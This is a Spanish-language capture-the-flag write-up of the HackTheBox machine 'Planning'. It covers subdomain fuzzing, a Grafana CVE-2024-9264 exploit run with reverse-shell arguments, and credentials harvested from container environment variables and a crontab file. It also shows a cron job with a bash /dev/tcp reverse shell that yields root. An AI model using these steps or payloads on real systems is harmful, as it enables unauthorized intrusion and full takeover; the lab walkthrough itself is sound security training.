# Writeup: HackTheBox - Planning

## Enumeración

### NMAP
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
```

### Subdominios (FFuF)
```bash
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w subdomains.txt -fs 178
```
Encontramos `grafana.planning.htb`. Accedemos con las credenciales proporcionadas por HTB: `admin / 0D5oT70Fq13EvB5r`.

## Explotación

Grafana v11.0.0 es vulnerable a **CVE-2024-9264 (RCE)**. Utilizamos un exploit para obtener una shell.

```bash
python3 cve-2024-9264.py --url http://grafana.planning.htb --username admin --password [PASS] --reverse-ip [TU_IP] --reverse-port 5555
```

Obtenemos acceso como root, pero dentro de un contenedor Docker.

## Escape de Docker

Revisando las variables de entorno (`env`), encontramos credenciales:
```text
GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
```

Conectamos por SSH con el usuario `enzo`:
```bash
ssh enzo@10.10.11.68
```
Flag de usuario obtenida en `user.txt`.

## Escalación de privilegios

Ejecutamos **Linpeas** y encontramos un archivo interesante: `/opt/crontabs/crontab.db`.

```json
{"name":"Grafana backup","command":"... zip -P P4ssw0rdS0pRi0T3c ..."}
```
Contraseña encontrada: `P4ssw0rdS0pRi0T3c`.

Vemos que el puerto 8000 está escuchando en localhost. Realizamos un túnel SSH:
```bash
ssh -N -L 8000:127.0.0.1:8000 enzo@planning.htb
```

Accedemos a `http://127.0.0.1:8000` con `root` y la contraseña `P4ssw0rdS0pRi0T3c`. Localizamos la opción de crear un nuevo crontab y añadimos una reverse shell:

```bash
bash -c 'exec bash -i &>/dev/tcp/[TU_IP]/1234 <&1'
```

Recibimos la conexión como root y obtenemos la flag en `root.txt`.
